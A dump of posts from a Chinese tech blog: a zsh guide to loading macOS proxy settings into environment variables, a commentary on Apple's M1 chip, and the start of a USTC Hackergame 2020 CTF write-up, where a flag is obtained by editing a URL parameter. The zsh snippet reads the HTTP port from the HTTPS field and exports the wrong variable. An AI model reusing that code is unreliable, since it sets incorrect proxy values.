也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full 